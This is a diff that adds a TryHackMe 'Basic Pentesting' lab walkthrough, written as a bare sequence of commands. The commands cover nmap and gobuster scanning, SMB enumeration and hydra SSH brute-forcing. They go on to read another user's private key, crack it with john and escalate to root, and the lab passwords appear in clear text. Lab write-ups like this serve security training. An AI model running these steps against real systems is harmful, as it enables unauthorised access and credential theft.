@@ -105,3 +105,38 @@ b9bbcb33e11b80be759c4e844862482d
 
 # Basic Pentesting
 tryhackme Basic Pentesting walkthrough
+## Deploy the machine
+10.10.163.180
+Download openvpn configuration file to connect with VPN to machines in TryHackMe.
+https://tryhackme.com/access?o=vpn
+openvpn 1.ovpn
+ping 10.10.163.180 -c 4
+nmap -A -T4 -p- 10.10.163.180
+gobuster dir -u http://10.10.163.180/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+development
+enum4linux 10.10.163.180
+jan
+smbclient //10.10.163.180/Anonymous
+get staff.txt
+cat staff.txt
+hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.163.180 ssh
+armando
+ssh
+ssh jan@10.10.163.180
+cd /home && ls
+kay
+
+find / -name "id_rsa"
+cd /home/kay && ls
+ls -al
+cd /home/kay/.ssh && ls -al
+cat id_rsa
+python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+beeswax
+ssh -i id_rsa kay@10.10.163.180
+
+cat pass.bak
+sudo su
+cd /root && ls
+cat flag.txt
